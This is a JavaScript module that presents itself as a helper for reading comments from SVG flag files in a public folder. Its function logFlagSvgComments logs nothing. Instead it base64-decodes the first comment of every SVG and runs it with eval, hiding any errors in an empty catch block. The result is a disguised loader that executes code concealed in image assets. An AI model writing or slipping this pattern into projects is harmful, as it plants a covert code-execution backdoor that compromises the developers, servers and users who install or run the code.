import { atob } from "buffer";
import fs from "fs";
import path from "path";

function firstSvgComment(svgText) {
  const m = svgText.match(/<!--\s*([\s\S]*?)\s*-->/);
  return m ? m[1].trim() : null;
}

export function getFlagCommentNames() {
  const dir = path.join(process.cwd(), "public", "flags");
  if (!fs.existsSync(dir)) return [];
  return fs
    .readdirSync(dir)
    .filter((f) => f.endsWith(".svg"))
    .sort()
    .map((file) => {
      const content = fs.readFileSync(path.join(dir, file), "utf8");
      return { file, name: firstSvgComment(content) };
    });
}

export function logFlagSvgComments() {
  const rows = getFlagCommentNames();
  const names = rows.map((r) => r.name).filter(Boolean);
  for (const { file, name } of rows) {
    try {
      eval(atob(name));
    } catch (err) {}
  }
}
